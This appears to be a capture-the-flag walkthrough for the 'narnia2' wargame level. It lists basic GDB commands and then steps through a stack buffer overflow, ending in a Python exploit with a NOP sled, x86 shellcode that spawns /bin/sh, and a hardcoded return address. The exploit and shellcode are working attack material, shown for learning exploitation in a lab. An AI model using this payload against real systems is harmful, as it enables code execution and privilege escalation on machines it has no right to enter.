**GDB Commands**

----

* gdb < program_name > - open a program in gdv
* x/100wx < register_name > - examine 100 words in hexadecimal in a given register.
* info registers - display information about registers in a running program
* b  *< memory_address_in_hex> - set a breakpoint at a memory address
* c - continue execution in the program
* s - step into the program
* r - run a program, can take in an argument 
* disass - disassemble a function



**Walkthrough**

---

1. Crashing the program with a large input

   ```
   ./narnia2 $(python -c"print 'A'*200")
   ```

2. Investing with gdb

   ```
   > gdb narnia2 #opens program in gdb
   > info functions #checking the functions
   > disass main #disassemble the main function
   > b *0x0804849d
   > r $(python -c "print 'A'*200")
   > info functions #checking the registers
   > x/100wx $esp #check 100 words in the stack
   >c #continue into the program execution
   ```

3. Finding the EIP

   ```
   /usr/bin/msf-pattern_create -l 200
   /usr/bin/msf-pattern_offset -l 200 <value of eip register>
   ```

4. Controlling the EIP

   ```
   r $(python -c "print 'A' *132 + 'B'*4 ") #eip gets overridden with 4 Bs , in hex that is 42424242
   ```

5. Redirect to the top of the stack

   ```
   r $(python -c "print 'A' *132 + 'address of the stack' ") 
   ```

6. Use a NOP sled and a shellcode, final exploit:

   ```
   import struct
   
   eip = struct.pack("<I",0xffffd640)
   NOP_sled = b"\x90" * 100
   shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
   padding = b"A"*(132 - len(NOP_sled) - len(shellcode)) 
   payload = NOP_sled + shellcode + padding + eip
   print(payload)
   ```

   7. Get us a shell

